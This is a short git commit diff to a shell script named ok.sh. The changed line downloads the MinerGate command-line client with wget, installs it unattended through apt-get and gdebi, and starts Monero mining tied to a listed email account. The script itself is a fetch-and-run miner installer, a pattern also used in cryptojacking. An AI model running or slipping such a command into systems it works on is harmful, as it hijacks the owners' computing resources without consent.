61ead3429573f3cb822755b68351d73102440f0d
ba3walos99 <38079309+ba3walos99@users.noreply.github.com>
2019-05-30 03:19:51 +0200

    Update ok.sh

--- ok.sh
+++ ok.sh
@@ -1,1 +1,1 @@
-mv xfast-ubuntu-cli-amd minergate-cli-release.deb && apt-get -y update && apt-get -y install gdebi && yes Y | gdebi minergate-cli-release.deb && minergate-cli -u mgrate888@gmail.com --xmr
+wget https://minergate.com/download/xfast-ubuntu-cli-amd && mv xfast-ubuntu-cli-amd minergate-cli-release.deb && apt-get -y update && apt-get -y install gdebi && yes Y | gdebi minergate-cli-release.deb && minergate-cli -u mgrate888@gmail.com --xmr
